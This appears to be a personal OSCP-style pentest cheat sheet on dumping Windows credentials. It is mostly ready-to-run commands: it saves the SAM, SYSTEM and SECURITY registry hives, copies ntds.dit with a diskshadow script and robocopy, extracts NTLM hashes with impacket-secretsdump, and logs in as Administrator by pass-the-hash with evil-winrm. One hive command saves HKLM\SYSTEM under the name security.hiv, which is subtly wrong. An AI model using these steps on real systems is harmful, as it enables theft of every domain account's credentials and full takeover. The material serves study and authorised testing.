we can use these hives to dump user NTLM hashes. We can then use the Administrator hash to authenticate instead of a plaintext password.

|**Storage File**|**Scope**|**What it Contains**|
|---|---|---|
|**`SAM` Hive**|**Local Machine**|Local accounts only (e.g., local `Administrator`, `Guest`, local service accounts).|
|**`ntds.dit`**|**Active Directory Domain**|All Domain accounts (e.g., Domain `Administrator`, Domain Users, Kerberos service accounts).|

```
reg save HKLM\SAM sam.hiv
```

```
reg save HKLM\SYSTEM system.hiv
```

```
reg save HKLM\SYSTEM security.hiv
```

Evil win rm only : 

```
download C:\\Users\\Public\\sam.hiv
```

```
download C:\\Users\\Public\\system.hiv
```

```
download C:\\Users\\Public\\security.hiv
```

---

With the files now on our local machine, we can use Impacket's secretsdump module to dump the user NTLM hashes.

```
impacket-secretsdump -sam sam.hiv -system system.hiv local
```

All 3
```
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv local
```

AD : ntds.dit
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
```

# Get NTDS.DIT

 This means the `emily` account is able to make a copy of the `NTDS.dit` file and the `HKLM\SYSTEM` hive. Those two files will allow us to dump the NT hash for all accounts.
 
bkup.txt
```powershell
set verbose on  
set metadata C:\Windows\Temp\meta.cab  
set context clientaccessible  
set context persistent  
begin backup  
add volume C: alias cdrive  
create  
expose %cdrive% E:  
end backup
```

```
cp ~/Desktop/Tools/Windows/bkup.txt . && python -m http.server 80
```

---

```
upload bkup.txt
```

making a backup  
```
diskshadow /s bkup.txt
```

![[Pasted image 20260911023559.png]]

![[Pasted image 20260911023659.png]]

making a copy of NTDS.dit  
```
robocopy /b E:\Windows\ntds . ntds.dit
```

![[Pasted image 20260911023733.png]]

```
reg save HKLM\SYSTEM system.hiv
```

```
download C:\\Users\\Public\\system.hiv
```

```
download ntds.dit
```

---

Impacket to dump hash
```
impacket-secretsdump -ntds ntds.dit -system system.hiv local
```

Enter with hash
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `evil-winrm -u Administrator -H [hash] -i ${discoveredDomain}`;

dv.paragraph("```bash\n" + command + "\n```");
```
